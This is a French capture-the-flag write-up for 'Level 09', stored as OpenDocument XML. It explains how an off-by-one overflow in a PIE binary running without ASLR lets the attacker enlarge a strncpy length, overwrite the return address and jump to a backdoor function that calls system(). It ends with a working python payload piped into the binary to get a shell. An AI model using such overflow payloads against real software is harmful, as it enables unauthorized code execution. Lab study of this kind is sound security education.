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CC70000145D0E25851C.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003DEA000023A903E958FD.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000041F100001CF1DCB01A87.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004399000008B0907ED1B6.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003FAB000021986726B10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1pt" fo:font-style="normal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1pt" fo:font-style="normal" style:text-underline-style="none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L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-style="normal" style:text-underline-style="none" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#6ab825" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#6ab825" fo:font-weight="bold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447fcf"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#447fcf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color="#d0d0d0"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#d0d0d0" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#3677a9"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#999999" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#ed9d1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cc0000" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:color="#006600" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T14" style:family="tex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color="#249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54911932081178763" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P1">Level 09</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P11">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P12">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P12">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P12">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">void</text:span> <text:s text:c="3"/><text:span text:style-name="T4">secret_backdoor</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">void</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P14">{</text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T6">buff[</text:span><text:span text:style-name="T8">128</text:span><text:span text:style-name="T6">];</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">fgets(buff,</text:span> <text:span text:style-name="T8">128</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">stdin);</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">system(buff);</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P14">}</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">void</text:span> <text:s text:c="3"/><text:span text:style-name="T4">set_username</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T6">*buff)<text:tab/></text:span><text:span text:style-name="T9">// [rbp-0x98]</text:span></text:p>
      <text:p text:style-name="P14">{</text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T6">uname[</text:span><text:span text:style-name="T8">128</text:span><text:span text:style-name="T6">];<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T9">// [rbp-0x90]</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T6">loop;<text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T9">// [rbp-0x4]</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">for</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">&lt;</text:span> <text:span text:style-name="T8">128</text:span><text:span text:style-name="T6">;</text:span> <text:span text:style-name="T6">i++)</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="8"/><text:span text:style-name="T6">uname[i]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T10">"&gt;: Enter your username"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T10">"&gt;&gt;: "</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">fgets(uname,</text:span> <text:span text:style-name="T8">128</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">stdin);</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">loop</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(loop</text:span> <text:span text:style-name="T6">&lt;=</text:span> <text:span text:style-name="T8">40</text:span> <text:span text:style-name="T6">&amp;&amp;</text:span> <text:span text:style-name="T6">uname[loop]</text:span> <text:span text:style-name="T6">!=</text:span> <text:span text:style-name="T10">'\0'</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="8"/><text:span text:style-name="T6">buff[</text:span><text:span text:style-name="T8">140</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T6">loop]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">uname[loop];</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="8"/><text:span text:style-name="T6">loop++;</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T10">"&gt;: Welcome, %s"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">buff</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T8">140</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P14">}</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">void</text:span> <text:s text:c="3"/><text:span text:style-name="T4">set_msg</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T6">*buff)<text:tab/><text:tab/></text:span><text:span text:style-name="T9">// [rbp-0x408]</text:span></text:p>
      <text:p text:style-name="P14">{</text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T6">msg[</text:span><text:span text:style-name="T8">1024</text:span><text:span text:style-name="T6">];<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T9">// [rbp-0x400]</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">for</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">&lt;</text:span> <text:span text:style-name="T8">1024</text:span><text:span text:style-name="T6">;</text:span> <text:span text:style-name="T6">i++)</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="8"/><text:span text:style-name="T6">msg[</text:span><text:span text:style-name="T8">1024</text:span><text:span text:style-name="T6">]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T10">'\0'</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T10">"&gt;: Msg @Unix-Dude"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T10">"&gt;&gt;: "</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">fgets(msg,</text:span> <text:span text:style-name="T8">1024</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">stdin);</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">strncpy(buff,</text:span> <text:span text:style-name="T6">msg,</text:span> <text:span text:style-name="T8">140</text:span><text:span text:style-name="T6">);</text:span> <text:s text:c="3"/><text:span text:style-name="T9">// 140 NOT hardcoded : "n" variable, buff+0xb4</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P14">}</text:p>
      <text:p text:style-name="P13"><text:soft-page-break/></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T1">void</text:span> <text:s text:c="3"/><text:span text:style-name="T4">handle_msg</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">void</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P14">{</text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:s text:c="7"/><text:span text:style-name="T6">buff[</text:span><text:span text:style-name="T8">180</text:span><text:span text:style-name="T6">];<text:tab/><text:tab/></text:span><text:span text:style-name="T9">// [rbp-0xc0]</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">unsigned</text:span> <text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T6">n</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">140</text:span><text:span text:style-name="T6">;<text:tab/><text:tab/></text:span><text:span text:style-name="T9">// [rbp-0xc]</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">for</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">140</text:span><text:span text:style-name="T6">;</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">&lt;</text:span> <text:span text:style-name="T8">40</text:span><text:span text:style-name="T6">;</text:span> <text:span text:style-name="T6">i++)</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="8"/><text:span text:style-name="T6">buff[i]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">set_username(buff);</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">set_msg(buff);</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T10">"&gt;: Msg sent!"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P14">}</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T4">main</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">void</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P14">{</text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T10">"--------------------------------------------\n| <text:s text:c="2"/>~Welcome to l33t-m$n ~ <text:s text:c="3"/>v1337 <text:s text:c="7"/>|\n--------------------------------------------"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T6">handle_msg();</text:span></text:p>
      <text:p text:style-name="P13"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P3">Il s'agit ici d'un <text:span text:style-name="T3">binaire x64</text:span><text:span text:style-name="T11">, programmé en C. Une particularité ici, est que ce binaire a été compilé </text:span><text:span text:style-name="T3">avec PIE </text:span><text:span text:style-name="T11">d'activé. On travaille donc ici avec du Position Independent Code. Concrètement, cela signifie que les instructions du programme, les variables etc... ne sont pas définis à des adresses absolues mais bien à des </text:span><text:span text:style-name="T3">offsets</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Par exemple, avant de lancer le programme, lorsqu'on le décompile avec </text:span><text:span text:style-name="T3">gdb </text:span><text:span text:style-name="T11">(ou qu'on l'examine avec </text:span><text:span text:style-name="T3">objdump</text:span><text:span text:style-name="T11">), on voit les instructions suivantes :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:x="-0.021cm" svg:y="0cm" svg:width="15.559cm" svg:height="5.212cm" draw:z-index="0"><draw:image xlink:href="Pictures/2000000700003CC70000145D0E25851C.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">On voit ici que les adresses des instructions ou des fonctions (</text:span><text:span text:style-name="T12">en rouge</text:span><text:span text:style-name="T11">) correspondent non pas à des adresses virtuelles, mais bien à un </text:span><text:span text:style-name="T3">offset par rapport à 0</text:span><text:span text:style-name="T11">. Lorsque le programme sera chargé en mémoire à une certaine adresse, le programme utilisera ces offsets pour calculer la position des instructions / des fonctions à partir de l'adresse de base à laquelle il aura été chargé en mémoire.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">On voit également </text:span><text:span text:style-name="T13">en vert</text:span><text:span text:style-name="T11"> que les variables sont également définies par un offset par rapport à l'instruction actuelle.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Il faut bien avoir conscience que, </text:span><text:span text:style-name="T3">sans ASLR</text:span><text:span text:style-name="T11">, le PIE n'a pas vraiment d'utilité. En effet, le PIE </text:span><text:soft-page-break/><text:span text:style-name="T11">permet aux programmes d'être chargé à n'importe quelle adresse virtuelle de base, puisqu'il fonctionne entièrement par le biais de calculs d'offsets. Il s'agit donc d'une caractéristique obligatoire afin de permettre à l'</text:span><text:span text:style-name="T3">ASLR </text:span><text:span text:style-name="T11">de s'appliquer au programme (l'ASLR s'occupera de charger le programme à une adresse de base aléatoire à chacune de ses exécutions).</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Cependant, si l'ASLR est désactivé, le programme sera toujours chargé à la même adresse mémoire à son exécution ; pour les programmes </text:span><text:span text:style-name="T3">PIE </text:span><text:span text:style-name="T11">sur x64, typiquement </text:span><text:span text:style-name="T14">0x000555555554000</text:span><text:span text:style-name="T11">. Le programme fonctionnera correctement et calculera ses offsets à partir de cette adresse de base fixe ; on aurait cependant pu hardcoder les adresses (qui seront toujours les mêmes) pour gagner en performance. De même, </text:span><text:span text:style-name="T3">PIE </text:span><text:span text:style-name="T11">sans </text:span><text:span text:style-name="T3">ASLR </text:span><text:span text:style-name="T11">ne permet en aucun cas de renforcer la sécurité d'un programme, puisque ses instructions seront toujours aux mêmes adresses.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Pour voir si l'</text:span><text:span text:style-name="T3">ASLR </text:span><text:span text:style-name="T11">est activé :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T11">cat /proc/sys/kernel/randomize_va_space</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">0 = désactivé.</text:p>
      <text:p text:style-name="P8">1 = distribution aléatoire de l'espace d'adressage de la bibliothèque partagée et des exécutables PIE. 2 = même fonction que le mode 1 + l'espace "brk" aléatoire.</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">Sur notre machine cible, l'<text:span text:style-name="T3">ASLR </text:span><text:span text:style-name="T11">est </text:span><text:span text:style-name="T3">désactivé</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8">Bref, intéressons-nous désormais au programme lui-même. L'idée générale est la suivante :</text:p>
      <text:p text:style-name="P8"/>
      <text:list xml:id="list8848882374618420570" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P9">On a un <text:span text:style-name="T3">buff[180]</text:span><text:span text:style-name="T11">.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P9"><text:span text:style-name="T11">Juste après, une variable </text:span><text:span text:style-name="T3">n </text:span><text:span text:style-name="T11">qui vaut </text:span><text:span text:style-name="T3">140 </text:span><text:span text:style-name="T11">(0x8c).</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P9"><text:span text:style-name="T11">La fonction </text:span><text:span text:style-name="T3">set_username</text:span><text:span text:style-name="T11"> demande un nom d'utilisateur via stdin et stock ce que l'utilisateur a entré dans </text:span><text:span text:style-name="T3">buff[140 – 180]</text:span><text:span text:style-name="T11"> (40 bytes maximum des 128 de stdin).</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P9"><text:span text:style-name="T11">La fonction </text:span><text:span text:style-name="T3">set_msg </text:span><text:span text:style-name="T11">demande un message à l'utilisateur, et stock ce que l'utilisateur a entré dans </text:span><text:span text:style-name="T3">buff[0 – 140]</text:span><text:span text:style-name="T11"> (140 bytes maximum des 1024 de stdin).</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P8"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11">La vulnérabilité était assez discrète. En réalité, il faut voir que la fonction </text:span><text:span text:style-name="T3">set_username</text:span><text:span text:style-name="T11"> ne copie pas </text:span><text:span text:style-name="T3">40 bytes </text:span><text:span text:style-name="T11">dans buff (</text:span><text:span text:style-name="T14">buff[140 – 180]</text:span><text:span text:style-name="T11">), mais </text:span><text:span text:style-name="T3">41 bytes </text:span><text:span text:style-name="T11">(</text:span><text:span text:style-name="T14">buff[140 – 181]</text:span><text:span text:style-name="T11">). Cet </text:span><text:span text:style-name="T3">overflow de 1 bytes</text:span><text:span text:style-name="T11"> nous permet d'écraser la variable </text:span><text:span text:style-name="T3">n </text:span><text:span text:style-name="T11">(0x8c), car celle-ci se situe juste après </text:span><text:span text:style-name="T3">buff</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11">Or, cette variable </text:span><text:span text:style-name="T3">n </text:span><text:span text:style-name="T11">est utilisée afin de définir </text:span><text:span text:style-name="T3">la taille du strncpy</text:span><text:span text:style-name="T11"> dans set_msg, permettant de copier les 140 (0x8c) premiers bytes de l'entrée standard dans le buffer </text:span><text:span text:style-name="T3">buff</text:span><text:span text:style-name="T11">. Typiquement :</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"><draw:frame draw:style-name="fr2" draw:name="images2" text:anchor-type="paragraph" svg:width="16.298cm" svg:height="8.601cm" draw:z-index="1"><draw:image xlink:href="Pictures/2000000700003FAB000021986726B102.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11">On contrôle la taille du </text:span><text:span text:style-name="T3">strncpy </text:span><text:span text:style-name="T11">via l'overflow sur la variable </text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T11">. On peut donc essayer d'augmenter la taille du strncpy jusqu'à overflow </text:span><text:span text:style-name="T3">buff</text:span><text:span text:style-name="T11"> et écraser l'adresse de retour de la fonction </text:span><text:span text:style-name="T3">handle_msg</text:span><text:span text:style-name="T11">, car </text:span><text:span text:style-name="T3">trop de caractères de l'input 'msg' auront été copiés dans buff</text:span><text:span text:style-name="T11"> :</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"><draw:frame draw:style-name="fr3" draw:name="images3" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.184cm" draw:z-index="2"><draw:image xlink:href="Pictures/2000000700004399000008B0907ED1B6.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"><draw:frame draw:style-name="fr1" draw:name="images4" text:anchor-type="paragraph" svg:x="0.071cm" svg:y="0cm" svg:width="15.85cm" svg:height="9.128cm" draw:z-index="3"><draw:image xlink:href="Pictures/2000000700003DEA000023A903E958FD.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">On a provoqué ici la copie de <text:span text:style-name="T3">0xff </text:span><text:span text:style-name="T11">(255) caractères ('C') de l'input utilisateur pour le message dans buff, qui ne peut en contenir que </text:span><text:span text:style-name="T3">180</text:span><text:span text:style-name="T11">. On a provoqué l'écrasement de l'adresse de retour par les caractères 'C' de notre input de </text:span><text:span text:style-name="T3">msg</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"><text:soft-page-break/><text:span text:style-name="T11">On calcule l'offset dans l'input </text:span><text:span text:style-name="T3">msg </text:span><text:span text:style-name="T11">qui nous permet d'overwrite l'adresse de retour de la fonction </text:span><text:span text:style-name="T3">handle_msg</text:span><text:span text:style-name="T11"> grâce à un pattern metasploit. On trouve l'offset </text:span><text:span text:style-name="T3">199</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11">On a désormais potentiellement le contrôle du flux d'exécution du programme. L'objectif va être ici bien sûr de le rediriger vers la fonction </text:span><text:span text:style-name="T3">secret_backdoor </text:span><text:span text:style-name="T11">qui nous offre une shell sur un plateau. Pour cela, rien de plus simple : on détermine l'adresse de cette fonction une fois le programme chargé en mémoire.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11">En effet, rappelons-nous que peu importe que le programme soit un </text:span><text:span text:style-name="T3">PIE</text:span><text:span text:style-name="T11">, </text:span><text:span text:style-name="T3">ASLR </text:span><text:span text:style-name="T11">est désactivé sur le système, donc les fonctions et les instructions seront en réalité chargées aux mêmes adresses virtuelles à chaque fois, qu'on soit dans le débugger ou non. Bref, l'adresse de </text:span><text:span text:style-name="T3">secret_backdoor </text:span><text:span text:style-name="T11">est la suivante : </text:span><text:span text:style-name="T14">0x000055555555488c</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11">Cette fonction prend en argument ce que l'utilisateur lui passe via </text:span><text:span text:style-name="T3">stdin</text:span><text:span text:style-name="T11">. On a désormais tout ce qu'il nous faut pour créer notre exploit :</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P8"><draw:frame draw:style-name="fr4" draw:name="images5" text:anchor-type="paragraph" svg:width="16.88cm" svg:height="7.408cm" draw:z-index="4"><draw:image xlink:href="Pictures/20000007000041F100001CF1DCB01A87.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">REMARQUE : On remplit le </text:span><text:span text:style-name="T3">stdin </text:span><text:span text:style-name="T11">de </text:span><text:span text:style-name="T3">set_msg </text:span><text:span text:style-name="T11">de </text:span><text:span text:style-name="T14">'\0'</text:span><text:span text:style-name="T11"> car on a besoin que l'adresse de retour soit 0x</text:span><text:span text:style-name="T3">0000</text:span><text:span text:style-name="T11">55555555488c, et si on mettait d'autres caractères après on aurait loupé ces quatre zeros.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Exécuter le binaire avec ce payload en entrée standard nous donne une shell.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt;&gt; </text:span><text:span text:style-name="T16">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T11">$ python -c "print('A' * 40 + '\xff' + 'B' * 87 + 'C' * 199 + '\x8c\x48\x55\x55\x55\x55' + '\x00' * (1024 - 207) + '/bin/sh\x00')" &gt; /tmp/payload </text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T15">$ </text:span><text:span text:style-name="T11">cat /tmp/payload - | ./level09</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">&gt;&gt; </text:span><text:span text:style-name="T16">Exploit automatique</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"/></text:p>
